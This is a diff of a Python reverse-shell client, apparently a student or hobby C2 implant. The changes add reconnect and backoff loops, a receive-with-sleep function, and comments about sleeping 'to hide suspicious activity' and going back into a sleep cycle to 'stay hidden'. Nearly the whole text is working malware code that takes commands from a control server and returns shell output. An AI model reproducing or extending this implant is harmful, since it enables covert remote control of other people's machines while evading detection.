@@ -16,16 +16,18 @@ sleep_sec = 10
 # CODE BEGINS
 ########################
 
-# Sleep
-# time.sleep(sleep_sec)
+# Sleep to hide suspicious activity UNCOMMENT IN FINAL VERSION
+# time.sleep(sleep_sec) UNCOMMENT IN FINAL VERSION
 
 # Create a socket to connect to the server
 connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection_socket.settimeout(CONNECTION_TIMEOUT)
 connection_socket.connect(ADDRESS)
 
-# Determine if the connection is live
+##### Function Setup #####
+
 def is_socket_connected():
+    ''' Determine if the socket is currently connected. '''
     try:
         unix_exit_code = connection_socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
         print(unix_exit_code)
@@ -34,30 +36,49 @@ def is_socket_connected():
         print("error: ", e)
         return False  # Catch any errors from checking the socket status
 
-# Connect to the server or sleep
 def sleep_or_connect():
+    """
+    Check to see if the server is listening for connections. If not, go to
+    sleep.
+    """
     while not is_socket_connected():
         try:
-            print("result: ", is_socket_connected())
+            print("is connected?: ", is_socket_connected())
             time.sleep(2)
+            connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connection_socket.settimeout(CONNECTION_TIMEOUT)
             connection_socket.connect(ADDRESS)
         except socket.timeout:
             # Sleep for twice the previous amound and try again
             sleep_sec = min(sleep_sec * 2, MAX_SLEEP)
-            # time.sleep(sleep_sec)
+            time.sleep(sleep_sec)
 
+def receive_or_sleep():
+    """
+    Check if a message was sent. Sleep (but not for too long) if the server took
+    a while (> 10 seconds) to send.
+    """
+    cmd = ""
+    while cmd == "":
+        try:
+            cmd = connection_socket.recv(config.PAYLOAD_SIZE)
+        except:
+            print("going to sleep!")
+            time.sleep(CONNECTION_TIMEOUT)
+            print("woke up!")
+    return cmd       
+
+##### Main Loop #####
 sleep_or_connect()
-# def receive_or_connect():
-
 
 # Receive the debug message
-message = connection_socket.recv(config.PAYLOAD_SIZE).decode()
+message = receive_or_sleep().decode()
 print("Debug message: ", message)
 
 # Client REPL loop - run the interactive shell
 while True:
     # Receive command from the C2 server
-    decrypted_command = connection_socket.recv(config.PAYLOAD_SIZE).decode()
+    decrypted_command = receive_or_sleep().decode()
     if decrypted_command == "exit" or decrypted_command == "hangup":
         # Go back into the sleep cycle, stay hidden
         connection_socket.close()
@@ -69,7 +90,6 @@ while True:
     # Let the server know the command ran, even if there's no output 
     if shell_output == "".encode():
         shell_output = " ".encode()
-
     # Send the results to the server
     encrypted_output = shell_output
     connection_socket.send(encrypted_output)
